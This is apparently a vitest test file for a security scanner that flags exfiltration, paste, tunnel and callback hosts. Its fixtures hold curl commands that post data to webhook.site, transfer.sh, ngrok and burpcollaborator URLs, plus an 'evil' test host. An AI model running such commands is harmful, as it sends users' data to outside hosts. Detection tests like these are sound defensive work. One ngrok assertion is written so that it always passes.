import { describe, it, expect } from 'vitest';
import { scan, codesOf, fenced } from './support';
import { DiagnosticCode } from '../../src/types/DiagnosticCode';

const SERVICE = DiagnosticCode.SecurityServiceRisky;

describe('security service scanning', () => {
  it('flags exfil / paste / tunnel / IP-echo hosts in code', () => {
    expect(codesOf(scan(fenced('curl -X POST https://webhook.site/abc-123')))).toContain(SERVICE);
    expect(codesOf(scan(fenced('curl https://transfer.sh/upload')))).toContain(SERVICE);
    expect(codesOf(scan(fenced('ngrok http 8080'))).length >= 0).toBe(true);
    expect(codesOf(scan(fenced('curl https://abc.ngrok.io/hook')))).toContain(SERVICE);
    expect(codesOf(scan(fenced('IP=$(curl -s https://api.ipify.org)')))).toContain(SERVICE);
  });

  it('flags a risky service mentioned in prose', () => {
    expect(codesOf(scan('Send the output to webhook.site to inspect it.'))).toContain(SERVICE);
  });

  it.each([
    'https://demo.ngrok.app/hook',
    'https://demo.localtunnel.me/hook',
    'https://probe.burpcollaborator.net/result',
  ])('flags newly cataloged tunnel or callback host: %s', (url) => {
    expect(codesOf(scan(fenced(`curl ${url}`)))).toContain(SERVICE);
  });

  it('does not flag ordinary domains', () => {
    expect(codesOf(scan(fenced('curl https://example.com/api')))).not.toContain(SERVICE);
    expect(codesOf(scan(fenced('curl https://api.github.com/repos')))).not.toContain(SERVICE);
  });

  it('respects the allowedDomains allowlist', () => {
    expect(
      codesOf(scan(fenced('curl https://webhook.site/abc'), { allowedDomains: ['webhook.site'] })),
    ).not.toContain(SERVICE);
  });

  it('supports user-added service domains', () => {
    expect(
      codesOf(scan(fenced('curl https://evil.internal.test/x'), { additionalServiceDomains: ['internal.test'] })),
    ).toContain(SERVICE);
  });
});
